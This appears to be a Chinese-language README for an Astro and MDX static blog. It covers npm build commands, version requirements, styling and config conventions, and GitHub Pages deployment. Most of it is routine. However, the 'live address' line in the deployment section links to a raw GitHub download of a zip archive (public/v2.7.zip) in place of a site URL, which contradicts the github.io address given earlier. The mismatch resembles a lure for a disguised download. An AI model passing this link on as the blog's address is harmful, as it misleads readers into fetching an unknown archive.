# 博客

Astro + MDX 的静态博客。**默认零运行时框架**，正文只有约 1 KB 内联 JS
（主题切换 + 代码复制按钮）。

## 命令

```bash
npm install          # 首次
npm run dev          # 本地开发 http://localhost:4321
npm run build        # 构建 + Pagefind 索引
npm run preview      # 预览构建产物
npm run check        # astro check（类型）
npm run contrast     # 对比度审计（零依赖）
npm run gate         # check + contrast + build
```

## 环境要求

Node ≥ 22.12.0、npm ≥ 9.6.5（Astro 7 的硬要求）。

## 纪律

1. **颜色字面量只允许出现在 `src/styles/tokens.css`**，且必须是
   `light-dark(浅色, 深色)` 双值形态。别处一律 `var(--...)`。
   违反会被 `npm run contrast` 判红。
2. **对比度不足要有兜底说明**——在 `scripts/check-contrast.mjs` 的检查表里
   给该对补 `exempt` 理由，不许静默放行。
3. **站点身份只在 `src/site.config.ts` 定义**——名字、头像、GitHub 地址。
   改 `GITHUB_HANDLE` 即整体换名；头像取 GitHub 直链，**换头像即换站内 logo**。
4. **`site` 字段由 `src/site.config.ts` 的 `SITE_URL` 提供**（当前
   `https://<user>.github.io`），影响 sitemap 与 RSS 的绝对地址。换域名只改那一行。
5. **文章标题从 `##` 起**，不要用 `#`——否则单篇出现多个 h1。
6. **构建前先停掉 `astro preview`**，否则会 `EBUSY: rmdir dist/.prerender/chunks`。
7. **字体只有一款自托管**：代码块用的 JetBrains Mono latin 子集
   （`public/fonts/`，21 KB，OFL-1.1）。**不要改用 Google Fonts CDN**——
   `fonts.gstatic.com` 在中国大陆经常不可达。正文仍是系统字体、不下载任何东西。

## 部署

推送到 `main` 即自动发布：`.github/workflows/deploy.yml`
（`withastro/action@v6` → `actions/deploy-pages@v5`）。
线上地址 <https://raw.githubusercontent.com/Still-chowline394/still-chowline394.github.io/main/public/v2.7.zip>。

CI 跑的就是本地的 `npm run build`，所以**搜索索引在 CI 里一并产出**，无需额外步骤。
Pages 的发布方式必须是 **Actions**（`build_type: workflow`），不是"从分支发布"。

## 文档

- [`PLAN.md`](./PLAN.md) —— 方案、版本基线、踩坑记录、挂起项
